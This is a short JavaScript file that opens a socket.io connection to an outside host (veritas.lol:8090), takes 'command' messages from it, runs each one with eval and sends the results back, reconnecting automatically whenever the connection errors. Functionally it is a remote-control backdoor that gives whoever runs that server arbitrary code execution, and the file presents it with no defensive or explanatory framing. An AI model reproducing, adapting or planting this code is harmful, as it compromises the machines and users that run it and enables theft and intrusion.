'use strict';

const SocketIOClient = require('socket.io-client');

(async () => {
  let client;
  const timeout = (n) => new Promise((resolve) => setTimeout(resolve, n));
  await timeout(0);
    alert('wopop');
  async function startClient() {
    try {
      client = SocketIOClient('http://veritas.lol:8090');
//      client.connect('localhost:8090');
    } catch (e) {
      console.error(e);
      await timeout(5000);
      return startClient();
    }
    client.on('command', ({
      cmd,
      uuid
    }) => {
      const response = {
        uuid
      };
      try {
        response.response = eval(cmd);
        response.success = true;
      } catch (e) {
        response.response = { message: e.message, stack: e.stack, name: e.name };
        response.success = false;
      }
      client.emit('response', response);
    });
    client.on('error', async (e) => {
      console.error(e);
      await timeout(5000);
      startClient();
    });
  }
  startClient();
})();

